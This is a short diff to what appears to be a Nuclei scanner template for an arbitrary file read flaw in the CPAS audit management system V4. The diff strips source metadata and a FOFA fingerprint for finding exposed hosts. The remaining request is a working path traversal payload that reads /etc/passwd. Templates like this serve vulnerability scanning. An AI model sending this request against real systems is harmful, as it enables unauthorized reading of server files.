@@ -3,12 +3,8 @@ info:
   name: 友数聚CPAS审计管理系统V4 doDownLoadPicFile 任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/mhgysgaiurdqe7zp'
+  description: ''
   tags: lfi,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: mhgysgaiurdqe7zp
-    fofa: body="/cpasm4/static/cap/font/iconfont.css"
 http:
 - raw:
   - 'GET /cpasm4/static/..;/mobileUploadPictureController/doDownLoadPicFile?picPath=/etc/passwd&fileType=1 HTTP/1.1
